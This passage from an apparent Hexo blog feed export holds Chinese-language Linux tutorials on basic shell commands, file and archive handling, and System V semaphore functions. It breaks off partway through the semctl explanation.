<p>【语法】which COMMAND<br><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">admintor@admintor-PC:~<span class="regexp">/Desktop$ which ps</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/ps</span></span><br><span class="line">admintor@admintor-PC:~<span class="regexp">/Desktop$ which python</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/p</span>ython</span><br></pre></td></tr></table></figure></p>
<h3 id="4-清除屏幕上显示的内容-clear"><a href="#4-清除屏幕上显示的内容-clear" class="headerlink" title="4.清除屏幕上显示的内容 - clear"></a>4.清除屏幕上显示的内容 - <strong>clear</strong></h3><h3 id="5-查看帮助文档-man-info-help-apropos"><a href="#5-查看帮助文档-man-info-help-apropos" class="headerlink" title="5.查看帮助文档 - man/info/help/apropos"></a>5.查看帮助文档 - <strong>man/info/help/apropos</strong></h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">admintor@admintor<span class="literal">-PC</span>:~/Desktop<span class="variable">$</span> <span class="built_in">ps</span> -<span class="literal">-help</span></span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line"> <span class="built_in">ps</span> [<span class="type">options</span>]</span><br><span class="line"></span><br><span class="line"> <span class="keyword">Try</span> <span class="string">&#x27;ps --help &lt;simple|list|output|threads|misc|all&gt;&#x27;</span></span><br><span class="line">  or <span class="string">&#x27;ps --help &lt;s|l|o|t|m|a&gt;&#x27;</span></span><br><span class="line"> <span class="keyword">for</span> additional help text.</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> more details see <span class="built_in">ps</span>(<span class="number">1</span>).</span><br><span class="line">admintor@admintor<span class="literal">-PC</span>:~/Desktop<span class="variable">$</span> <span class="built_in">man</span> <span class="built_in">ps</span></span><br><span class="line"><span class="built_in">PS</span>(<span class="number">1</span>)                                                    User Commands                                                    <span class="built_in">PS</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       <span class="built_in">ps</span> - report a snapshot of the current processes.</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="built_in">ps</span> [<span class="type">options</span>]</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h3 id="6-查看系统和主机名-uname-hostname"><a href="#6-查看系统和主机名-uname-hostname" class="headerlink" title="6.查看系统和主机名 - uname/hostname"></a>6.查看系统和主机名 - <strong>uname/hostname</strong></h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">admintor@</span>admintor-PC:~/Desktop$ uname</span><br><span class="line">Linux</span><br><span class="line"><span class="symbol">admintor@</span>admintor-PC:~/Desktop$ hostname</span><br><span class="line">admintor-PC</span><br></pre></td></tr></table></figure>
<h3 id="7-时间和日期-date-cal"><a href="#7-时间和日期-date-cal" class="headerlink" title="7.时间和日期 - date/cal"></a>7.时间和日期 - <strong>date/cal</strong></h3><figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">admintor@admintor-PC:~/Desktop$ date</span><br><span class="line">2020年 02月 08日 星期六 15:56:50 CST</span><br><span class="line">admintor@admintor-PC:~/Desktop$ cal</span><br><span class="line">      二月<span class="number"> 2020 </span>        </span><br><span class="line">日 一 二 三 四 五 六  </span><br><span class="line">                  <span class="number"> 1 </span> </span><br><span class="line"><span class="number"> 2 </span><span class="number"> 3 </span><span class="number"> 4 </span><span class="number"> 5 </span><span class="number"> 6 </span><span class="number"> 7 </span><span class="number"> 8 </span> </span><br><span class="line"><span class="number"> 9 </span>10<span class="number"> 11 </span>12<span class="number"> 13 </span>14<span class="number"> 15 </span> </span><br><span class="line">16<span class="number"> 17 </span>18<span class="number"> 19 </span>20<span class="number"> 21 </span>22  </span><br><span class="line">23<span class="number"> 24 </span>25<span class="number"> 26 </span>27<span class="number"> 28 </span>29  </span><br><span class="line">                      </span><br><span class="line">admintor@admintor-PC:~/Desktop$ cal<span class="number"> 5 </span>2017</span><br><span class="line">      五月<span class="number"> 2017 </span>        </span><br><span class="line">日 一 二 三 四 五 六  </span><br><span class="line">   <span class="number"> 1 </span><span class="number"> 2 </span><span class="number"> 3 </span><span class="number"> 4 </span><span class="number"> 5 </span><span class="number"> 6 </span> </span><br><span class="line"><span class="number"> 7 </span><span class="number"> 8 </span><span class="number"> 9 </span>10<span class="number"> 11 </span>12<span class="number"> 13 </span> </span><br><span class="line">14<span class="number"> 15 </span>16<span class="number"> 17 </span>18<span class="number"> 19 </span>20  </span><br><span class="line">21<span class="number"> 22 </span>23<span class="number"> 24 </span>25<span class="number"> 26 </span>27  </span><br><span class="line">28<span class="number"> 29 </span>30<span class="number"> 31 </span>    </span><br></pre></td></tr></table></figure>
<h3 id="8-重启和关机-reboot-shutdown"><a href="#8-重启和关机-reboot-shutdown" class="headerlink" title="8.重启和关机 - reboot/shutdown"></a>8.重启和关机 - <strong>reboot/shutdown</strong></h3><h3 id="9-退出登录-exit-logout"><a href="#9-退出登录-exit-logout" class="headerlink" title="9.退出登录 - exit/logout"></a>9.退出登录 - <strong>exit/logout</strong></h3><h3 id="10-查看历史命令-history"><a href="#10-查看历史命令-history" class="headerlink" title="10.查看历史命令 - history"></a>10.查看历史命令 - <strong>history</strong></h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">admintor@admintor-PC:~/Desktop$ <span class="keyword">history</span></span><br><span class="line">...</span><br><span class="line"><span class="number">441</span>  whatis <span class="keyword">python</span></span><br><span class="line"><span class="number">442</span>  whereis <span class="keyword">ps</span></span><br><span class="line"><span class="number">443</span>  whereis <span class="keyword">python</span></span><br><span class="line"><span class="number">444</span>  which <span class="keyword">ps</span></span><br><span class="line"><span class="number">445</span>  which <span class="keyword">python</span></span><br><span class="line"><span class="number">446</span>  <span class="keyword">ps</span> --<span class="keyword">help</span></span><br><span class="line"><span class="number">447</span>  man <span class="keyword">ps</span></span><br><span class="line"><span class="number">448</span>  uname</span><br><span class="line"><span class="number">449</span>  <span class="built_in">hostname</span></span><br><span class="line"><span class="number">450</span>  date</span><br><span class="line"><span class="number">451</span>  <span class="keyword">cal</span></span><br><span class="line"><span class="number">452</span>  <span class="keyword">cal</span> <span class="number">5</span> <span class="number">2017</span></span><br><span class="line"><span class="number">453</span>  <span class="keyword">history</span></span><br><span class="line">admintor@admintor-PC:~/Desktop$ !<span class="number">452</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>查看到历史命令后，可以用！历史命令编号来重新执行该命令；通过history -c 可以清除历史命令。</p>
</blockquote>
]]></content>
      <categories>
        <category>Linux学习</category>
      </categories>
      <tags>
        <tag>Linux学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux使用程序</title>
    <url>/2020/02/12/Linux%E4%BD%BF%E7%94%A8%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="文件和文件夹操作"><a href="#文件和文件夹操作" class="headerlink" title="文件和文件夹操作"></a>文件和文件夹操作</h2><h3 id="1-创建-删除空目录-mkdir-rmdir"><a href="#1-创建-删除空目录-mkdir-rmdir" class="headerlink" title="1.创建/删除空目录 - mkdir/rmdir"></a>1.创建/删除空目录 - <strong>mkdir/rmdir</strong></h3><span id="more"></span>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root ~</span>]<span class="meta"># mkdir abc</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># mkdir -p xyz/abc</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># rmdir abc</span></span><br></pre></td></tr></table></figure>
<h3 id="2-创建-删除文件-touch-rm"><a href="#2-创建-删除文件-touch-rm" class="headerlink" title="2.创建/删除文件 - **touch/rm"></a>2.创建/删除文件 - **touch/rm</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root ~</span>]<span class="meta"># touch readme.txt</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># touch <span class="meta-keyword">error</span>.txt</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># rm <span class="meta-keyword">error</span>.txt</span></span><br><span class="line">rm: <span class="keyword">remove</span> regular empty file ‘error.txt’? y</span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># rm -rf xyz</span></span><br></pre></td></tr></table></figure>
<ul>
<li>touch命令用于创建空白文件或修改文件时间。在Linux系统中一个文件有三种时间：<ul>
<li>更改内容的时间 - mtime</li>
<li>更改权限的时间呢 - ctime</li>
<li>最后访问时间 - atime</li>
</ul>
</li>
<li>rm的几个重要参数<ul>
<li>-i: 交互式删除，每个删除项都会进行询问</li>
<li>-r：删除目录并递归的删除目录中的文件和目录</li>
<li>-f：强制删除，忽略不存在的文件，没有任何提示</li>
</ul>
</li>
</ul>
<h3 id="3-切换和查看当前工作目录-cd-pwd"><a href="#3-切换和查看当前工作目录-cd-pwd" class="headerlink" title="3.切换和查看当前工作目录 - cd/pwd"></a>3.切换和查看当前工作目录 - <strong>cd/pwd</strong></h3><p>说明：</p>
<blockquote>
<p>cd命令后面可以跟相对路径（以当前路径作为参照）或绝对路径（以/开关）来切换到指定的目录，也可以用cd .. 来返回上一级目录。请大家想一想，如果要返回到上上一级目录应该给cd命令加上什么样的参数呢？</p>
</blockquote>
<h3 id="4-查看目录内容-ls"><a href="#4-查看目录内容-ls" class="headerlink" title="4.查看目录内容 - ls"></a>4.查看目录内容 - <strong>ls</strong></h3><ul>
<li>-l：以长格式查看文件和目录</li>
<li>-a：显示以点开头的文件和目录（隐藏文件）</li>
<li>-R：遇到目录要进行递归展开（继续列出目录下面的文件和目录）</li>
<li>-d：只列出目录，不列出其他内容</li>
<li>-s/-t：按大小/时间排序</li>
</ul>
<blockquote>
<p>ls -l 可以简写为ll</p>
</blockquote>
<h3 id="5-查看文件内容-cat-tac-head-tail-more-less-rev-od"><a href="#5-查看文件内容-cat-tac-head-tail-more-less-rev-od" class="headerlink" title="5.查看文件内容 - cat/tac/head/tail/more/less/rev/od"></a>5.查看文件内容 - <strong>cat/tac/head/tail/more/less/rev/od</strong></h3><ul>
<li>cat: 由第一行开始显示内容，并将所有内容输出</li>
<li>tac: 从最后一行倒序显示内容，并将所有内容输出</li>
<li>rev：从每一行的最后一个字符显示到第一个字符</li>
<li>head：只显示头几行</li>
<li>tail：只显示后几行</li>
<li>more：根据窗口大小，一页一页的显示文件内容</li>
<li>less：和more类似，但其优点可以往前翻页，而且进行可以搜索字符</li>
<li>od：以八进制、十进制、十六进制和ASCII码的格式来显示文件或者流<ul>
<li>od [-A 地址进制] [-t 显示格式] 文件名</li>
<li>-A 指定地址进制包括：<ul>
<li>o:八进制（系统默认值）</li>
<li>d：十进制</li>
<li>x：十六进制</li>
<li>n：不打印位移值</li>
</ul>
</li>
<li>-t：指定数据的显示格式的主要参数有：<ul>
<li>c：ASCII字符或反斜杠序列（如\n）</li>
<li>d：有符号十进制数</li>
<li>f：浮点数</li>
<li>o：八进制（系统默认值）</li>
<li>u：无符号十进制数</li>
<li>x：十六进制数</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="6-拷贝-移动文件-cp-mv"><a href="#6-拷贝-移动文件-cp-mv" class="headerlink" title="6.拷贝/移动文件 - cp/mv"></a>6.拷贝/移动文件 - <strong>cp/mv</strong></h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root ~</span>]<span class="meta"># mkdir backup</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># cp sohu.html backup/</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># cd backup</span></span><br><span class="line">[<span class="meta">root backup</span>]<span class="meta"># ls</span></span><br><span class="line">sohu.html</span><br><span class="line">[<span class="meta">root backup</span>]<span class="meta"># mv sohu.html sohu_index.html</span></span><br><span class="line">[<span class="meta">root backup</span>]<span class="meta"># ls</span></span><br><span class="line">sohu_index.html</span><br></pre></td></tr></table></figure>
<h3 id="7-文件重命名-rename"><a href="#7-文件重命名-rename" class="headerlink" title="7.文件重命名 - rename"></a>7.文件重命名 - <strong>rename</strong></h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">[root@iZwz<span class="number">97</span>tbg<span class="meta">o9</span>lkab<span class="symbol">nat2</span>l<span class="meta">o8</span>Z ~]<span class="attr"># rename .htm .html *.htm</span></span><br></pre></td></tr></table></figure>
<h3 id="8-查找文件和查找内容-find-grep"><a href="#8-查找文件和查找内容-find-grep" class="headerlink" title="8.查找文件和查找内容 - find/grep"></a>8.查找文件和查找内容 - <strong>find/grep</strong></h3><p>【find】：find 路径 参数 文件名<br>参数：</p>
<ul>
<li>-name：根据文件名查找</li>
<li>-perm：根据文件权限查找</li>
<li>-prune：该选项可以排除某些查找目录</li>
<li>-user：根据文件属主查找</li>
<li>-group：根据文件属组查找</li>
<li>-mtime -n | +n 根据文件更改时间查找</li>
<li>-type：根据文件类型查找、<ul>
<li>-f: 文件</li>
<li>-d：目录</li>
<li>-c：字符设备文件</li>
<li>-b：块设备文件</li>
<li>-l：链接文件</li>
<li>-p：管道文件</li>
</ul>
</li>
<li>-size -n +n 按文件大小查找<br>【grep】：grep [选项] [文本] 文件<blockquote>
<p>说明：grep在搜索字符串时可以使用正则表达式，如果需要使用正则表达式可以用grep -E 或直接使用egrep</p>
</blockquote>
</li>
</ul>
<h3 id="9-创建链接和查看链接-ln-readlink"><a href="#9-创建链接和查看链接-ln-readlink" class="headerlink" title="9.创建链接和查看链接 -ln/readlink"></a>9.创建链接和查看链接 -<strong>ln/readlink</strong></h3><p>软链接：</p>
<ul>
<li>存放另一个文件的路径的形式</li>
<li>可以跨文件系统，硬链接不可以</li>
<li>可以对一个不存在的文件名进行链接，硬链接必须有源文件</li>
<li>可以对目录进行链接</li>
</ul>
<p>硬链接：</p>
<ul>
<li>以文本副本的形式存在，不占用实际空间</li>
<li>不允许给目录创建硬链接</li>
<li>只有在同一个文件系统中才能创建</li>
<li>删除其中一个硬链接文件并不影响其他有相同inode号的文件</li>
</ul>
<blockquote>
<p>【ln】：[参数] [源文件目录] [目标文件或目录]</p>
</blockquote>
<p>主要参数：</p>
<ul>
<li>-i:交互模式，文件存在则提示用户是否覆盖</li>
<li>-s 软链接（符号链接）</li>
<li>-d 允许超级用户制作目录的硬链接</li>
<li>-b 删除，覆盖以前建立的链接</li>
</ul>
<h3 id="10-压缩-解压缩和归档-解归档-gzip-gunzip-xz"><a href="#10-压缩-解压缩和归档-解归档-gzip-gunzip-xz" class="headerlink" title="10.压缩/解压缩和归档/解归档 - gzip/gunzip/xz"></a>10.压缩/解压缩和归档/解归档 - <strong>gzip/gunzip/xz</strong></h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[root@iZwz97tbgo9lkabnat2lo8Z ~]</span># <span class="selector-tag">wget</span> <span class="selector-tag">http</span>:<span class="comment">//download.redis.io/releases/redis-4.0.10.tar.gz</span></span><br><span class="line"><span class="selector-tag">--2018-06-20</span> <span class="selector-tag">19</span>:<span class="selector-tag">29</span>:<span class="selector-tag">59--</span>  <span class="selector-tag">http</span>:<span class="comment">//download.redis.io/releases/redis-4.0.10.tar.gz</span></span><br><span class="line"><span class="selector-tag">Resolving</span> <span class="selector-tag">download</span><span class="selector-class">.redis</span><span class="selector-class">.io</span> (download.redis.io)... <span class="selector-tag">109</span><span class="selector-class">.74</span><span class="selector-class">.203</span><span class="selector-class">.151</span></span><br><span class="line"><span class="selector-tag">Connecting</span> <span class="selector-tag">to</span> <span class="selector-tag">download</span><span class="selector-class">.redis</span><span class="selector-class">.io</span> (download.redis.io)|<span class="selector-tag">109</span><span class="selector-class">.74</span><span class="selector-class">.203</span><span class="selector-class">.151</span>|:<span class="selector-tag">80</span>... <span class="selector-tag">connected</span>.</span><br><span class="line"><span class="selector-tag">HTTP</span> <span class="selector-tag">request</span> <span class="selector-tag">sent</span>, <span class="selector-tag">awaiting</span> <span class="selector-tag">response</span>... <span class="selector-tag">200</span> <span class="selector-tag">OK</span></span><br><span class="line"><span class="selector-tag">Length</span>: <span class="selector-tag">1738465</span> (<span class="number">1.7</span>M) <span class="selector-attr">[application/x-gzip]</span></span><br><span class="line"><span class="selector-tag">Saving</span> <span class="selector-tag">to</span>: ‘<span class="selector-tag">redis-4</span><span class="selector-class">.0</span><span class="selector-class">.10</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span>’</span><br><span class="line"><span class="selector-tag">100%</span><span class="selector-attr">[==================================================&gt;]</span> <span class="selector-tag">1</span>,<span class="selector-tag">738</span>,<span class="selector-tag">465</span>   <span class="selector-tag">70</span><span class="selector-class">.1KB</span>/<span class="selector-tag">s</span>   <span class="selector-tag">in</span> <span class="selector-tag">74s</span></span><br><span class="line"><span class="selector-tag">2018-06-20</span> <span class="selector-tag">19</span>:<span class="selector-tag">31</span>:<span class="selector-tag">14</span> (<span class="number">22.9</span> KB/s) <span class="selector-tag">-</span> ‘<span class="selector-tag">redis-4</span><span class="selector-class">.0</span><span class="selector-class">.10</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span>’ <span class="selector-tag">saved</span> <span class="selector-attr">[1738465/1738465]</span></span><br><span class="line"><span class="selector-attr">[root@iZwz97tbgo9lkabnat2lo8Z ~]</span># <span class="selector-tag">ls</span> <span class="selector-tag">redis</span>*</span><br><span class="line"><span class="selector-tag">redis-4</span><span class="selector-class">.0</span><span class="selector-class">.10</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line"><span class="selector-attr">[root@iZwz97tbgo9lkabnat2lo8Z ~]</span># <span class="selector-tag">gunzip</span> <span class="selector-tag">redis-4</span><span class="selector-class">.0</span><span class="selector-class">.10</span><span class="selector-class">.tar</span><span class="selector-class">.gz</span></span><br><span class="line"><span class="selector-attr">[root@iZwz97tbgo9lkabnat2lo8Z ~]</span># <span class="selector-tag">ls</span> <span class="selector-tag">redis</span>*</span><br><span class="line"><span class="selector-tag">redis-4</span><span class="selector-class">.0</span><span class="selector-class">.10</span><span class="selector-class">.tar</span></span><br></pre></td></tr></table></figure>
<h3 id="11-归档和解归档-tar"><a href="#11-归档和解归档-tar" class="headerlink" title="11.归档和解归档 - tar"></a>11.归档和解归档 - <strong>tar</strong></h3><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">[root@iZwz97tbgo9lkabnat2lo8Z ~]# tar -xvf redis<span class="string">-4</span>.0.10.tar</span><br><span class="line">redis<span class="string">-4</span>.0.10/</span><br><span class="line">redis<span class="string">-4</span>.0.10/.gitignore</span><br><span class="line">redis<span class="string">-4</span>.0.10/00-RELEASENOTES</span><br><span class="line">redis<span class="string">-4</span>.0.10/BUGS</span><br><span class="line">redis<span class="string">-4</span>.0.10/CONTRIBUTING</span><br><span class="line">redis<span class="string">-4</span>.0.10/COPYING</span><br><span class="line">redis<span class="string">-4</span>.0.10/INSTALL</span><br><span class="line">redis<span class="string">-4</span>.0.10/MANIFESTO</span><br><span class="line">redis<span class="string">-4</span>.0.10/Makefile</span><br><span class="line">redis<span class="string">-4</span>.0.10/README.md</span><br><span class="line">redis<span class="string">-4</span>.0.10/deps/</span><br><span class="line">redis<span class="string">-4</span>.0.10/deps/Makefile</span><br><span class="line">redis<span class="string">-4</span>.0.10/deps/README.md</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<blockquote>
<p>说明：归档（也称为创建归档）和解归档都使用tar命令，通常创建归档需要-cvf三个参数，其中c表示创建（create），v表示显示创建归档详情（verbose），f表示指定归档的文件（file）；解归档需要加上-xvf参数，其中x表示抽取（extract），其他两个参数跟创建归档相同。</p>
</blockquote>
<h3 id="12-将标准输入转成命令行参数-xargs"><a href="#12-将标准输入转成命令行参数-xargs" class="headerlink" title="12.将标准输入转成命令行参数 - xargs"></a>12.将标准输入转成命令行参数 - <strong>xargs</strong></h3><p>下面的命令会将查找当前路径下的html文件，然后通过xargs将这些文件作为参数传给rm命令，实现查找并删除文件的操作</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">[root@iZwz97tbgo9lkabnat2lo8Z ~]# find . -<span class="keyword">type</span> <span class="type">f </span>-name <span class="string">&quot;*.html&quot;</span> | xargs rm -f</span><br></pre></td></tr></table></figure>
<p>下面的命令讲a.txt文件中的多行内容变成一行输出到b.txt文件中，其中&lt;表示从a.txt中读取输入，&gt;表示讲命令的执行结果输出到b.txt中</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">[root@iZwz97tbgo9lkabnat2lo8Z ~]<span class="comment"># xargs &lt; a.txt &gt; b.txt</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>说明：这个命令就像上面演示的那样常在管道（实现进程间通信的一种方式）和重定向（重新指定输入输出的位置）操作中用到，后面的内容中会讲到管道操作和输入输出重定向操作。</p>
</blockquote>
<h3 id="13-显示文件或目录-basename-dirname"><a href="#13-显示文件或目录-basename-dirname" class="headerlink" title="13.显示文件或目录 - basename/dirname"></a>13.显示文件或目录 - <strong>basename/dirname</strong></h3><h3 id="14-其他相关工具"><a href="#14-其他相关工具" class="headerlink" title="14.其他相关工具"></a>14.其他相关工具</h3><ul>
<li>sort - 对内容排序</li>
<li>uniq - 去掉相邻重复内容</li>
<li>tr - 替换指定内容为新内容</li>
<li>cut/paste - 剪切/粘贴内容</li>
<li>split - 拆分文件</li>
<li>file - 判断文件类型</li>
<li>wc - 统计文件行数、单词数、字节数</li>
<li>iconv - 编码转换</li>
</ul>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root ~</span>]<span class="meta"># cat foo.txt</span></span><br><span class="line">grape</span><br><span class="line">apple</span><br><span class="line">pitaya</span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># cat bar.txt</span></span><br><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="number">300</span></span><br><span class="line"><span class="number">400</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># paste foo.txt bar.txt</span></span><br><span class="line">grape   <span class="number">100</span></span><br><span class="line">apple   <span class="number">200</span></span><br><span class="line">pitaya  <span class="number">300</span></span><br><span class="line">        <span class="number">400</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># paste foo.txt bar.txt &gt; hello.txt</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># cut -b 4-8 hello.txt</span></span><br><span class="line">pe      <span class="number">10</span></span><br><span class="line">le      <span class="number">20</span></span><br><span class="line">aya     <span class="number">3</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># cat hello.txt | tr &#x27;\t&#x27; &#x27;,&#x27;</span></span><br><span class="line">grape,<span class="number">100</span></span><br><span class="line">apple,<span class="number">200</span></span><br><span class="line">pitaya,<span class="number">300</span></span><br><span class="line">,<span class="number">400</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># split -l 100 sohu.html hello</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># wget https://www.baidu.com/img/bd_logo1.png</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># file bd_logo1.png</span></span><br><span class="line">bd_logo1.png: PNG image data, <span class="number">540</span> x <span class="number">258</span>, <span class="number">8</span>-bit colormap, non-interlaced</span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># wc sohu.html</span></span><br><span class="line">  <span class="number">2979</span>   <span class="number">6355</span> <span class="number">212527</span> sohu.html</span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># wc -l sohu.html</span></span><br><span class="line"><span class="number">2979</span> sohu.html</span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># wget http://www.qq.com -O qq.html</span></span><br><span class="line">[<span class="meta">root ~</span>]<span class="meta"># iconv -f gb2312 -t utf-8 qq.html</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux学习</category>
      </categories>
      <tags>
        <tag>Linux学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux进程间通信——信号量</title>
    <url>/2020/10/29/Linux%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E2%80%94%E2%80%94%E4%BF%A1%E5%8F%B7%E9%87%8F/</url>
    <content><![CDATA[<h2 id="Linux进程间通信——信号量"><a href="#Linux进程间通信——信号量" class="headerlink" title="Linux进程间通信——信号量"></a>Linux进程间通信——信号量</h2><h3 id="信号量简介"><a href="#信号量简介" class="headerlink" title="信号量简介"></a>信号量简介</h3><h4 id="为什么需要信号量"><a href="#为什么需要信号量" class="headerlink" title="为什么需要信号量"></a>为什么需要信号量</h4><p>为了防止出现因多个程序同时访问一个共享资源而引发的一系列问题，我们需要一种方法，它可以通过生成并使用令牌来授权，在任一时刻只能有一个执行线程访问代码的临界区域。临界区域是指执行数据更新的代码需要独占式地执行。而信号量就可以提供这样的一种访问机制，让一个临界区同一时间只有一个线程在访问它，也就是说信号量是用来调协进程对共享资源的访问的。<br><span id="more"></span><br>信号量是一种特殊的变量，访问具有原子性。</p>
<p>只允许对它进行两个操作：</p>
<p>1) 等待信号量</p>
<p>当信号量值为0时，程序等待；当信号量值大于0时，信号量减1，程序继续运行。</p>
<p>2) 发送信号量</p>
<p>将信号量值加1。</p>
<h4 id="信号量的工作原理"><a href="#信号量的工作原理" class="headerlink" title="信号量的工作原理"></a>信号量的工作原理</h4><p>由于信号量只能进行两种操作等待和发送信号，即P(sv)和V(sv),他们的行为是这样的：<br>P(sv)：如果sv的值大于零，就给它减1；如果它的值为零，就挂起该进程的执行<br>V(sv)：如果有其他进程因等待sv而被挂起，就让它恢复运行，如果没有进程因等待sv而挂起，就给它加1.</p>
<p>举个例子，就是两个进程共享信号量sv，一旦其中一个进程执行了P(sv)操作，它将得到信号量，并可以进入临界区，使sv减1。而第二个进程将被阻止进入临界区，因为当它试图执行P(sv)时，sv为0，它会被挂起以等待第一个进程离开临界区域并执行V(sv)释放信号量，这时第二个进程就可以恢复执行。</p>
<h3 id="信号量使用"><a href="#信号量使用" class="headerlink" title="信号量使用"></a>信号量使用</h3><p>Linux提供了一组精心设计的信号量接口来对信号进行操作，它们不只是针对二进制信号量，下面将会对这些函数进行介绍，但请注意，这些函数都是用来对成组的信号量值进行操作的。它们声明在头文件sys/sem.h中。</p>
<h4 id="semget函数"><a href="#semget函数" class="headerlink" title="semget函数"></a>semget函数</h4><p>它的作用是创建一个新信号量或取得一个已有信号量，原型为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semget</span><span class="params">(<span class="keyword">key_t</span> key,<span class="keyword">int</span> num_sems,<span class="keyword">int</span> sem_flags)</span></span>;</span><br></pre></td></tr></table></figure>
<p><strong>key:</strong> 整数值（唯一非零），<br>不相关的进程可以通过它访问一个信号量，它代表程序可能要使用的某个资源，程序对所有信号量的访问都是间接的，程序先通过调用semget函数并提供一个键，再由系统生成一个相应的信号标识符（semget函数的返回值），只有semget函数才直接使用信号量键，所有其他的信号量函数使用由semget函数返回的信号量标识符。如果多个程序使用相同的key值，key将负责协调工作。</p>
<p><strong>num_sems:</strong> 指定需要的信号量数目，值几乎总是1。</p>
<p><strong>sem_flags:</strong> 是一组标志，当想要当信号量不存在时创建一个新的信号量，可以和值IPC_CREAT做按位或操作。设置了IPC_CREAT标志后，即使给出的键是一个已有信号量的键，也不会产生错误。而IPC_CREAT | IPC_EXCL则可以创建一个新的，唯一的信号量，如果信号量已存在，返回一个错误。</p>
<p>semget函数成功返回一个相应信号标识符（非零），失败返回-1.</p>
<h4 id="semop函数"><a href="#semop函数" class="headerlink" title="semop函数"></a>semop函数</h4><p>它的作用是改变信号量的值，原型为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semop</span><span class="params">(<span class="keyword">int</span> sem_id,struct sembuf *sem_opa,<span class="keyword">size_t</span> num_sem_ops)</span></span>;</span><br></pre></td></tr></table></figure>
<p><strong>sem_id:</strong> 由semget返回的信号量标识符<strong>sembuf:</strong> 结构如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span>&#123;</span></span><br><span class="line">    <span class="keyword">short</span> sem_num;<span class="comment">//除非使用一组信号量，否则它为0</span></span><br><span class="line">    <span class="keyword">short</span> sem_op;<span class="comment">//信号量在一次操作中需要改变的数据，通常是两个数，一个是-1，即P（等待）操作</span></span><br><span class="line">    <span class="comment">//一个是+1，即V（发送信号）操作</span></span><br><span class="line">    <span class="keyword">short</span> sem_flg;<span class="comment">//通常SEM_UNDO，使操作系统跟踪信号</span></span><br><span class="line">    <span class="comment">//并在进程没有释放信号量终止时，操作系统释放信号量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>num_sem_ops:</strong> 进行操作信号量的个数，即sops结构变量的个数，需大于或等于1.此值常等于1，只完成对一个信号量的操作。</p>
<p>semop函数成功返回信号量集的标识符，错误返回-1；</p>
<h4 id="semctl函数"><a href="#semctl函数" class="headerlink" title="semctl函数"></a>semctl函数</h4><p>该函数用来直接控制信号量信息，它的原型为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semctl</span><span class="params">(<span class="keyword">int</span> sem_id,<span class="keyword">int</span> sem_num,<span class="keyword">int</span> command,[<span class="keyword">union</span> semun sem_union])</span></span>;</span><br></pre></td></tr></table></figure>
<p><strong>sem_id:</strong> 信号量集标识符<br><strong>sem_mum:</strong> 信号量集数组上的下标，表示某一个信号量<br><strong>command:</strong> 有两个值SETVAL,IPC_RMID，分别表示初始化和删除信号量。</p>
<p>如果有第四个参数，它通常是一个union semum结构，定义如下：</p>
